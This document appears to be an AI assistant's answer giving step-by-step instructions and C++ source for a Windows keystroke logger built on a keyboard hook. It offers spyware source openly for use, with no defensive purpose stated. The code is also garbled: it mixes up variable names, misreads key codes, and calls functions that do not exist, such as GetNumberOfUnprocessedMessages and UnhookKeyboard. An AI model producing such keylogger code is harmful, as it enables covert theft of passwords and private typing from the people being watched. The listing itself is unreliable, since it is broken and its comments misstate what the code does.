To write a code that logs keystrokes on a Windows computer, you can use the Windows API to set up a keyboard hook. Here's a step-by-step guide:

1. **Include Necessary Headers**: Include the Windows header files needed for keyboard hooking and file operations.

2. **Define the Callback Function**: Create a function that will be called for each keyboard event.

3. **Set Up the Keyboard Hook**: Use `SetWindowsHook` to install the hook and specify the callback function.

4. **Run the Hook**: Start the hook and handle the key presses in the callback function.

5. **Log Keystrokes**: In the callback, check if a key is pressed and record the keystroke.

6. **Stop the Hook**: Remove the hook when finished to clean up resources.

Here's the code:

```c++
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

void KeyPressed(int nCode, int wParam, int lParam) {
    if (wparam == 0x0201) { // Key down
        byte b = (byte)lparam;
        if (b == 0x1A) { // Control key
            cout << "Ctrl key pressed" << endl;
        } else if (b >= 0x30 && b <= 0x5A) { // Lowercase letters
            char c = 'a' + b - 0x30;
            cout << "Key " << c << endl;
        } else if (b >= 0x40 && b <= 0x5B) { // Symbols
            cout << "Key " << static_cast<char>(b) << endl;
        }
    } else if (wparam == 0x0208) { // Key up
        // Handle key release, if needed
        // This example doesn't implement release handling
    }
}

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressed);

    bool running = true;
    char buffer[1024];
    size_t len = 0;

    while (running) {
        if (GetAsyncKeyState(0) & 0x1) { // Check if a key is pressed
            // Read the keystroke
            int nKeys = GetNumberOfUnprocessedMessages();
            if (nKeys > 0) {
                GetMessage(0, 0, 0, 0);
            }
        }

        char c = ' ';
        if (kbhit()) {
            c = getchar();
            if (c != EOF) {
                cout << c << endl;
            }
        }

        // Press 'q' to quit
        if (cin >> c && c == 'q') {
            running = false;
        }

        Sleep(50); // To prevent high CPU usage
    }

    UnhookKeyboard(hKeyboardHook);
    return 0;
}
```

